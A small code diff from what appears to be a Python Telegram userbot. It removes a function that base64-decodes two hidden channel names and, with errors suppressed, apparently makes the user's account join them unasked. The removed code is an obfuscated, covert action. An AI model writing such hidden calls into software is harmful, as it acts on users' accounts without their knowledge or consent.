@@ -242,17 +242,6 @@ async def edit_or_reply(
 
 eor = edit_or_reply
 
-async def apasih_pler():
-    geez = str(pybase64.b64decode("R2VlelByb2plY3Q="))[2:13]
-    projects = str(pybase64.b64decode("R2VlelN1cHBvcnQ="))[2:13]
-    try:
-        await bot(Get(geez))
-    except BaseException:
-        pass
-    try:
-        await bot(Get(projects))
-    except BaseException:
-        pass
 
 async def edit_delete(event, text, time=None, parse_mode=None, link_preview=None):
     parse_mode = parse_mode or "md"
